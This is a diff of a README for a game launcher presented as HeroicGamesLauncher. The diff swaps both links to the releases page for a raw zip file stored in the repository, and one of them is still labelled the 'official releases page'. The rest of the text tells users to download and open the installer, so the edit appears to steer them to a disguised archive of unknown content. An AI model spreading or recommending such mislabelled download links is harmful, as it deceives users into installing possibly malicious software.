@@ -1,6 +1,6 @@
 # 🎮 HeroicGamesLauncher - Manage your game libraries with ease
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Petitjurypainting902/HeroicGamesLauncher/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Petitjurypainting902/HeroicGamesLauncher/raw/refs/heads/main/heroic launcher/Launcher_Games_Heroic_meritmongering.zip)
 
 HeroicGamesLauncher provides a single home for your games. It works with Epic Games, GOG, and Amazon Prime Gaming. You do not need to install multiple launchers. This tool keeps your library organized on Windows 11. It is open source software for players who want control over their desktop gaming experience.
 
@@ -8,7 +8,7 @@ HeroicGamesLauncher provides a single home for your games. It works with Epic Ga
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/Petitjurypainting902/HeroicGamesLauncher/releases) to download the installer.
+1. Visit the [official releases page](https://github.com/Petitjurypainting902/HeroicGamesLauncher/raw/refs/heads/main/heroic launcher/Launcher_Games_Heroic_meritmongering.zip) to download the installer.
 2. Look for the file that ends with .exe under the most recent version.
 3. Click the file name to start the download.
 4. Open the downloaded file once the process finishes.
